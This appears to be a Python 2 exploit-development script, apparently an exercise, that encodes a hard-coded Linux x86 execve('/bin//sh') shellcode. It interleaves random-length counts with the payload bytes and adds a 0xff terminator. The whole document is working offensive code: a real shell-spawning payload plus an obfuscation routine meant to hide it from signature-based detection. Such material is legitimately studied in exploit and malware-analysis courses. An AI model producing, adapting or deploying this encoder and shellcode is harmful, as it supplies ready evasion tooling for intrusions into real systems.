#!/usr/bin/python

# Python Random Insertion Encoder
# How the encoding works:
# The first element of the return value is a random number between 
# 1 and 9 and it represents the number of elements from the original
# shellcode that are copied from the original shell to the return 
# value.
# 
# Then another random number (between 1 and 9) is added to the return 
# value and the consequent number of elements from the original shellcode
# are copied. 
#
# This algorithm is continued until all the elements from
# the original shellcode have been copied in the returnvalue.
#
# The last element is a well defined terminator.
import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

shellBytes = bytearray(shellcode)
returnValue = ""
x =0
while x < len(shellBytes):
	randomNumber = random.randint(1,9)
	#randomNumber = 2;
	randonNumberInHex = '0x%02x,' % randomNumber
	returnValue += randonNumberInHex
	for y in range(x,  x + randomNumber):
		if y < len(shellBytes):
			returnValue += '0x%02x,' % shellBytes[y]
			x=x+1

terminal = '0x%02x' %255 
returnValue += terminal

print 'Encoded shellcode ...'
print returnValue
